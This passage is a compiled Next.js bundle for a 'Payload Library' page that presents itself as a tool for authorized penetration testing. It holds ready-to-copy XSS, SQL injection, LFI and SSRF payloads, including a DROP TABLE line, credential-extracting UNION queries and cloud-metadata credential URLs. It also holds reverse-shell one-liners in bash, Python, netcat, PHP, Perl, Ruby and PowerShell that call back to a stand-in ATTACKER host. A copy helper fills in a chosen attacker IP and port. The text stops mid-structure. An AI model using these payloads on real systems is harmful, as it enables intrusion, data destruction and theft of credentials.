module.exports = {

"[project]/src/app/payloads/page.tsx [app-ssr] (ecmascript)": ((__turbopack_context__) => {
"use strict";

var { r: __turbopack_require__, f: __turbopack_module_context__, i: __turbopack_import__, s: __turbopack_esm__, v: __turbopack_export_value__, n: __turbopack_export_namespace__, c: __turbopack_cache__, M: __turbopack_modules__, l: __turbopack_load__, j: __turbopack_dynamic__, P: __turbopack_resolve_absolute_path__, U: __turbopack_relative_url__, R: __turbopack_resolve_module_id_path__, b: __turbopack_worker_blob_url__, g: global, __dirname, x: __turbopack_external_require__, y: __turbopack_external_import__, z: __turbopack_require_stub__ } = __turbopack_context__;
{
__turbopack_esm__({
    "default": (()=>PayloadsPage)
});
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_import__("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_import__("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react.js [app-ssr] (ecmascript)");
'use client';
;
;
const PAYLOADS = {
    xss: [
        {
            label: 'Basic script tag',
            payload: "<script>alert('XSS')</script>"
        },
        {
            label: 'IMG onerror',
            payload: "<img src=x onerror=alert(1)>"
        },
        {
            label: 'SVG onload',
            payload: "<svg onload=alert(document.cookie)>"
        },
        {
            label: 'Details ontoggle',
            payload: "<details open ontoggle=alert(1)>"
        },
        {
            label: 'DOM-based (href)',
            payload: "javascript:alert(document.domain)"
        },
        {
            label: 'Filter bypass (encoded)',
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;"
        },
        {
            label: 'CSP bypass via JSONP',
            payload: "<script src=https://cdn.jsdelivr.net/callback=alert></script>",
            notes: 'Requires CSP allowing CDN'
        },
        {
            label: 'Data URI',
            payload: "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>"
        },
        {
            label: 'Template literal',
            payload: '${alert(1)}'
        },
        {
            label: 'Angular ng-src',
            payload: "{{constructor.constructor('alert(1)')()}}",
            notes: 'AngularJS 1.x SSTI'
        }
    ],
    sqli: [
        {
            label: 'Basic OR bypass',
            payload: "' OR '1'='1"
        },
        {
            label: 'Comment bypass',
            payload: "' OR 1=1--"
        },
        {
            label: 'UNION column count',
            payload: "' ORDER BY 1--"
        },
        {
            label: 'UNION data extract',
            payload: "' UNION SELECT null,username,password FROM users--"
        },
        {
            label: 'Time-based blind (MySQL)',
            payload: "' AND SLEEP(5)--"
        },
        {
            label: 'Time-based blind (MSSQL)',
            payload: "'; WAITFOR DELAY '0:0:5'--"
        },
        {
            label: 'Boolean blind',
            payload: "' AND 1=1--"
        },
        {
            label: 'Error-based (MySQL)',
            payload: "' AND extractvalue(1,concat(0x7e,database()))--"
        },
        {
            label: 'Stacked queries',
            payload: "'; DROP TABLE users--",
            notes: 'MySQL only with stacked query support'
        },
        {
            label: 'Out-of-band (DNS)',
            payload: "' UNION SELECT LOAD_FILE(concat('\\\\\\\\',database(),'.attacker.com\\\\'))--"
        }
    ],
    shells: [
        {
            label: 'Bash TCP',
            payload: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
        },
        {
            label: 'Python3 TCP',
            payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
        },
        {
            label: 'Netcat (with -e)',
            payload: "nc -e /bin/sh ATTACKER 4444"
        },
        {
            label: 'Netcat (without -e)',
            payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f"
        },
        {
            label: 'PHP one-liner',
            payload: "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        },
        {
            label: 'PowerShell',
            payload: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER\",4444)"
        },
        {
            label: 'Perl',
            payload: "perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        },
        {
            label: 'Ruby',
            payload: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"ATTACKER\",4444))'"
        }
    ],
    lfi: [
        {
            label: 'Basic traversal',
            payload: "../../../../etc/passwd"
        },
        {
            label: 'Double encoding',
            payload: "..%252f..%252f..%252fetc%252fpasswd"
        },
        {
            label: 'Null byte (PHP < 5.3)',
            payload: "../../../../etc/passwd%00"
        },
        {
            label: 'Wrapper php://filter',
            payload: "php://filter/convert.base64-encode/resource=index.php"
        },
        {
            label: 'Wrapper expect://',
            payload: "expect://whoami"
        },
        {
            label: 'Log poisoning (access log)',
            payload: "/var/log/apache2/access.log",
            notes: 'After injecting PHP in User-Agent'
        },
        {
            label: 'Proc environ',
            payload: "/proc/self/environ"
        },
        {
            label: 'SSRF to localhost',
            payload: "http://127.0.0.1:80/"
        },
        {
            label: 'SSRF AWS metadata',
            payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        },
        {
            label: 'SSRF IPv6',
            payload: "http://[::1]:80/"
        }
    ],
    ssrf: [
        {
            label: 'Localhost bypass',
            payload: "http://localhost/admin"
        },
        {
            label: 'IPv6 localhost',
            payload: "http://[::1]/admin"
        },
        {
            label: 'Decimal IP',
            payload: "http://2130706433/"
        },
        {
            label: 'Octal IP',
            payload: "http://0177.0.0.1/"
        },
        {
            label: 'AWS IMDSv1',
            payload: "http://169.254.169.254/latest/meta-data/"
        },
        {
            label: 'GCP metadata',
            payload: "http://metadata.google.internal/computeMetadata/v1/"
        },
        {
            label: 'Azure metadata',
            payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        },
        {
            label: 'DNS rebinding prep',
            payload: "http://attacker.com/",
            notes: 'Set attacker.com to resolve to 127.0.0.1 after first request'
        }
    ]
};
const TABS = [
    {
        id: 'xss',
        label: 'XSS',
        icon: '🌐'
    },
    {
        id: 'sqli',
        label: 'SQL Injection',
        icon: '💉'
    },
    {
        id: 'shells',
        label: 'Rev Shells',
        icon: '🐚'
    },
    {
        id: 'lfi',
        label: 'LFI / RFI',
        icon: '📁'
    },
    {
        id: 'ssrf',
        label: 'SSRF',
        icon: '🔄'
    }
];
function PayloadsPage() {
    const [activeTab, setActiveTab] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])('xss');
    const [copied, setCopied] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])(null);
    const [search, setSearch] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])('');
    const [attacker, setAttacker] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])('10.10.10.10');
    const [port, setPort] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])('4444');
    function copy(payload) {
        const final = payload.replace(/ATTACKER/g, attacker).replace(/4444/g, port);
        navigator.clipboard.writeText(final);
        setCopied(final);
        setTimeout(()=>setCopied(null), 2000);
    }
    const payloads = PAYLOADS[activeTab] ?? [];
    const filtered = search ? payloads.filter((p)=>p.label.toLowerCase().includes(search.toLowerCase()) || p.payload.toLowerCase().includes(search.toLowerCase())) : payloads;
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        className: "p-5",
        children: [
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: "mb-5",
                children: [
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
                        className: "text-2xl font-black",
                        children: [
                            "Payload ",
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                className: "text-accent",
                                children: "Library"
                            }, void 0, false, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 93,
                                columnNumber: 53
                            }, this)
                        ]
                    }, void 0, true, {
                        fileName: "[project]/src/app/payloads/page.tsx",
                        lineNumber: 93,
                        columnNumber: 9
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                        className: "font-mono text-[11px] text-slate-500 mt-1",
                        children: "Curated offensive payloads for authorized penetration testing"
                    }, void 0, false, {
                        fileName: "[project]/src/app/payloads/page.tsx",
                        lineNumber: 94,
                        columnNumber: 9
                    }, this)
                ]
            }, void 0, true, {
                fileName: "[project]/src/app/payloads/page.tsx",
                lineNumber: 92,
                columnNumber: 7
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: "flex gap-2 mb-4 flex-wrap",
                children: TABS.map((t)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                        onClick: ()=>{
                            setActiveTab(t.id);
                            setSearch('');
                        },
                        className: `flex items-center gap-2 font-mono text-[11px] px-4 py-2 rounded-lg border transition-all
              ${activeTab === t.id ? 'border-accent/30 text-accent bg-accent/8' : 'border-white/[0.08] text-slate-500 hover:text-slate-300'}`,
                        children: [
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                children: t.icon
                            }, void 0, false, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 107,
                                columnNumber: 13
                            }, this),
                            t.label
                        ]
                    }, t.id, true, {
                        fileName: "[project]/src/app/payloads/page.tsx",
                        lineNumber: 102,
                        columnNumber: 11
                    }, this))
            }, void 0, false, {
                fileName: "[project]/src/app/payloads/page.tsx",
                lineNumber: 100,
                columnNumber: 7
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: "grid grid-cols-[1fr_260px] gap-4",
                children: [
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                        className: "space-y-3",
                        children: [
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "relative",
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: "absolute left-3 top-1/2 -translate-y-1/2 text-slate-600",
                                        children: "⌕"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 116,
                                        columnNumber: 13
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("input", {
                                        value: search,
                                        onChange: (e)=>setSearch(e.target.value),
                                        placeholder: `Search ${activeTab} payloads...`,
                                        className: "w-full bg-white/[0.04] border border-white/[0.08] rounded-lg pl-8 pr-4 py-2.5 font-mono text-[12px] text-slate-300 outline-none placeholder-slate-700 focus:border-accent/30 transition-colors"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 117,
                                        columnNumber: 13
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 115,
                                columnNumber: 11
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "glass overflow-hidden",
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "px-4 py-2.5 border-b border-white/[0.06]",
                                        style: {
                                            background: 'rgba(0,255,170,0.03)'
                                        },
                                        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                            className: "font-mono text-[10px] text-accent tracking-widest uppercase",
                                            children: [
                                                activeTab.toUpperCase(),
                                                " PAYLOADS — ",
                                                filtered.length
                                            ]
                                        }, void 0, true, {
                                            fileName: "[project]/src/app/payloads/page.tsx",
                                            lineNumber: 127,
                                            columnNumber: 15
                                        }, this)
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 126,
                                        columnNumber: 13
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "divide-y divide-white/[0.03]",
                                        children: filtered.map((p, i)=>{
                                            const final = p.payload.replace(/ATTACKER/g, attacker).replace(/4444/g, port);
                                            const isCopied = copied === final;
                                            return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                className: "group px-4 py-3 hover:bg-white/[0.03] transition-colors",
                                                children: [
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                        className: "flex items-start justify-between gap-3 mb-1.5",
                                                        children: [
                                                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                                className: "font-mono text-[10px] font-bold text-slate-400",
                                                                children: p.label
                                                            }, void 0, false, {
                                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                                lineNumber: 138,
                                                                columnNumber: 23
                                                            }, this),
                                                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                                                                onClick: ()=>copy(p.payload),
                                                                className: `font-mono text-[9px] px-2 py-1 rounded border shrink-0 transition-all
                          ${isCopied ? 'border-accent/35 text-accent bg-accent/8' : 'border-white/[0.08] text-slate-600 hover:border-accent/25 hover:text-accent'}`,
                                                                children: isCopied ? '✓ COPIED' : '📋 COPY'
                                                            }, void 0, false, {
                                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                                lineNumber: 139,
                                                                columnNumber: 23
                                                            }, this)
                                                        ]
                                                    }, void 0, true, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 137,
                                                        columnNumber: 21
                                                    }, this),
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("code", {
                                                        className: "block font-mono text-[11px] text-slate-300 leading-relaxed break-all",
                                                        style: {
                                                            background: 'rgba(0,0,0,0.3)',
                                                            padding: '8px 10px',
                                                            borderRadius: '6px'
                                                        },
                                                        children: final
                                                    }, void 0, false, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 147,
                                                        columnNumber: 21
                                                    }, this),
                                                    p.notes && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                        className: "font-mono text-[9px] text-slate-600 mt-1.5",
                                                        children: [
                                                            "ℹ ",
                                                            p.notes
                                                        ]
                                                    }, void 0, true, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 152,
                                                        columnNumber: 23
                                                    }, this)
                                                ]
                                            }, i, true, {
                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                lineNumber: 136,
                                                columnNumber: 19
                                            }, this);
                                        })
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 131,
                                        columnNumber: 13
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 125,
                                columnNumber: 11
                            }, this)
                        ]
                    }, void 0, true, {
                        fileName: "[project]/src/app/payloads/page.tsx",
                        lineNumber: 113,
                        columnNumber: 9
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                        className: "space-y-4",
                        children: [
                            [
                                'shells',
                                'ssrf'
                            ].includes(activeTab) && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "glass p-4",
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "font-mono text-[9px] text-slate-600 uppercase tracking-widest mb-3",
                                        children: "Shell Config"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 165,
                                        columnNumber: 15
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "space-y-3",
                                        children: [
                                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                children: [
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("label", {
                                                        className: "font-mono text-[9px] text-slate-600 block mb-1",
                                                        children: "ATTACKER IP"
                                                    }, void 0, false, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 170,
                                                        columnNumber: 19
                                                    }, this),
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("input", {
                                                        value: attacker,
                                                        onChange: (e)=>setAttacker(e.target.value),
                                                        className: "w-full bg-white/[0.04] border border-white/[0.08] rounded-lg px-3 py-2 font-mono text-[12px] text-accent outline-none focus:border-accent/30 transition-colors"
                                                    }, void 0, false, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 171,
                                                        columnNumber: 19
                                                    }, this)
                                                ]
                                            }, void 0, true, {
                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                lineNumber: 169,
                                                columnNumber: 17
                                            }, this),
                                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                children: [
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("label", {
                                                        className: "font-mono text-[9px] text-slate-600 block mb-1",
                                                        children: "PORT"
                                                    }, void 0, false, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 176,
                                                        columnNumber: 19
                                                    }, this),
                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("input", {
                                                        value: port,
                                                        onChange: (e)=>setPort(e.target.value),
                                                        className: "w-full bg-white/[0.04] border border-white/[0.08] rounded-lg px-3 py-2 font-mono text-[12px] text-accent outline-none focus:border-accent/30 transition-colors"
                                                    }, void 0, false, {
                                                        fileName: "[project]/src/app/payloads/page.tsx",
                                                        lineNumber: 177,
                                                        columnNumber: 19
                                                    }, this)
                                                ]
                                            }, void 0, true, {
                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                lineNumber: 175,
                                                columnNumber: 17
                                            }, this),
                                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                className: "font-mono text-[9px] text-slate-600 p-2.5 rounded-lg border border-accent/10 bg-accent/[0.03]",
                                                children: "Payloads auto-replace ATTACKER and port with your values on copy."
                                            }, void 0, false, {
                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                lineNumber: 181,
                                                columnNumber: 17
                                            }, this)
                                        ]
                                    }, void 0, true, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 168,
                                        columnNumber: 15
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 164,
                                columnNumber: 13
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                className: "glass p-4",
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "font-mono text-[9px] text-slate-600 uppercase tracking-widest mb-3",
                                        children: "Resources"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 189,
                                        columnNumber: 13
                                    }, this),
